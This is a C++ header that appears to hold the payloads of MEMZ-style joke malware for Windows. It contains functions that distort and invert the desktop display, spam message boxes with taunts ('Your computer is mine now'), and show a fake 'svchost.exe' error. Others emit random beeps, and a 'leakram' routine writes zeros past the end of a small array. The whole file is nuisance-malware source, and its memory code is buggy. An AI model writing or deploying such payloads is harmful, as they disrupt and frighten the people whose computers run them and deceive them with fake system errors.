#pragma once
#include "include.h"
#define fori(x) for (INT i = 0; i < x; i++)

HWND hWNDdesk = GetDesktopWindow();
HDC hDCdesk = GetDC(NULL);

void RotBlt(HDC destDC, int srcx1, int srcy1, int srcx2, int srcy2,
    HDC srcDC, int destx1, int desty1, int thetaInDegrees, DWORD mode)
{
    double theta = thetaInDegrees * (3.14159 / 180);
    //multiply degrees by PI/180 to convert to radians

    //determine width and height of source
    int width = srcx2 - srcx1;
    int height = srcy2 - srcy1;

    //determine centre/pivot point ofsource
    int centreX = int(float(srcx2 + srcx1) / 2);
    int centreY = int(float(srcy2 + srcy1) / 2);

    //since image is rotated we need to allocate a rectangle
    //which can hold the image in any orientation
    if (width > height)height = width;
    else
        width = height;


    //allocate memory and blah blah
    HDC memDC = CreateCompatibleDC(destDC);
    HBITMAP memBmp = CreateCompatibleBitmap(destDC, width, height);

    HBITMAP obmp = (HBITMAP)SelectObject(memDC, memBmp);

    //pivot point of our mem DC
    int newCentre = int(float(width) / 2);

    //hmmm here's the rotation code. X std maths :|
    for (int x = srcx1; x <= srcx2; x++)
        for (int y = srcy1; y <= srcy2; y++)
        {
            COLORREF col = GetPixel(srcDC, x, y);

            int newX = int((x - centreX) * sin(theta) + (y - centreY) * cos(theta));
            int newY = int((x - centreX) * cos(theta) - (y - centreY) * sin(theta));


            SetPixel(memDC, newX + newCentre, newY + newCentre, col);
        }

    //splash onto the destination
    BitBlt(destDC, destx1, desty1, width, height, memDC, 0, 0, mode);


    //free mem and blah
    SelectObject(memDC, obmp);

    DeleteDC(memDC);
    DeleteObject(memBmp);
}

int p1() { //msgbox
    MSGBOXPARAMS msg2 = { 0 };
    msg2.cbSize = sizeof(MSGBOXPARAMS);
    msg2.hwndOwner = NULL;
    msg2.hInstance = GetModuleHandle(NULL);
    msg2.lpszText = "Your computer is now dead! MUAHAHHAHAHHAAHHAHAHAHHAHHA";
    msg2.lpszCaption = "Your computer is mine now";
    msg2.dwStyle = MB_OK | MB_ICONHAND;
    HANDLE hmsg2 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg2, NULL, NULL);

    MSGBOXPARAMS msg1 = { 0 };
    msg1.cbSize = sizeof(MSGBOXPARAMS);
    msg1.hwndOwner = NULL;
    msg1.hInstance = GetModuleHandle(NULL);
    msg1.lpszText = "Error in application \"svchost.exe\": terminating...";
    msg1.lpszCaption = "Error";
    msg1.dwStyle = MB_YESNO | MB_ICONQUESTION;
    HANDLE hmsg3 = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg1, NULL, NULL);

    return 0;
}

int p2() { //memz final payload but random
    fori(50) {

        //msgbox spam
        DWORD dwID = 0;
        MSGBOXPARAMS msg = { 0 };
        msg.cbSize = sizeof(MSGBOXPARAMS);
        msg.hwndOwner = NULL;
        msg.hInstance = GetModuleHandle(NULL);
        msg.lpszText = "bet you regret that now huh";
        msg.lpszCaption = "ez";
        msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, NULL, NULL);


        HWND desktop = GetDesktopWindow();
        HDC desk = GetDC(NULL);
        RECT rect;
        GetWindowRect(desktop, &rect);
        int w = rect.right - rect.left;
        int h = rect.bottom - rect.top;
        StretchBlt(desk, rand() % 100, rand() % 100, w - rand() % 100, h - rand() % 100, desk, 0, 0, w, h, MERGECOPY);
        Sleep(300 - (4 * i));
        TextOutA(desk, 100, 100, "Hey look its ur screen down below", 33);
        StretchBlt(desk, 100, 200, 300, 500, desk, 0, 0, w, h, SRCPAINT);

        HRGN hRegion1;
        hRegion1 = CreateRectRgn(0, 0, w, h);
        InvertRgn(desk, hRegion1);

        Beep(rand() % 30000, rand() % 1000);

    }
    return 0;
}

int p3() {
    HWND desktop = GetDesktopWindow();
    RECT rect;
    GetWindowRect(desktop, &rect);
    INT w = rect.right - rect.left;
    INT h = rect.bottom - rect.top;
    HDC desk = GetDC(NULL);
    PatBlt(desk, rand() % 100, rand() % 100, w, h, DSTINVERT);

    INT sw = GetSystemMetrics(SM_CXSCREEN);
    INT sh = GetSystemMetrics(SM_CYSCREEN);
    SelectObject(desk, CreateSolidBrush(RGB(rand() % 123, rand() % 431, rand() % 311)));

    for (INT index = 0; index < 100; index++) {
        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, 0x9273ecef);
        BitBlt(desk, rand() % 21 - 10, rand() % 21 - 10, sw, sh, desk, 0, 0, PATINVERT);
    }

    return 0;

}

int p4() {
    //funny switch window effect, sort of like zooming in and out
    INT xDesk = GetSystemMetrics(SM_CXSCREEN);
    INT yDesk = GetSystemMetrics(SM_CYSCREEN);
    RECT rect;
    GetWindowRect(hWNDdesk, &rect);
    INT w = rect.right - rect.left;
    INT h = rect.bottom - rect.top;
    SelectObject(hDCdesk, CreateSolidBrush(RGB(rand() % 255, rand() % 25, rand() % 255)));

    int j = 0;
    int deg = 0;

    for (int i = 0; i < 1980; i++) {
        j = i;
        deg = i % 180;
        RotBlt(hDCdesk, j, j, w, h, hDCdesk, i, i, i, SRCCOPY);
        RotBlt(hDCdesk, 50, 50, w, h, hDCdesk, i, i, i, SRCCOPY);
        Sleep(5);
    }
    return 0;
}

int leakram() {
    unsigned long long ramsize = 0;
    const char* array[] = { "AB" };
    GetPhysicallyInstalledSystemMemory((PULONGLONG)ramsize);
    
    for (unsigned long long i = 0; i < ramsize; i++) {
        if (!(i % 100)) {
            //ZeroMemory(&array[distribution(generator)], 1);
            ZeroMemory(&array[i], 1);
            Sleep(rand() % 5000);
        }
    }
    return 0;
}

/*int cleanup() {
    CloseHandle(hmsg2);
    CloseHandle(hmsg3);
    ReleaseDC(NULL, desk);
    return 0;
}
*/
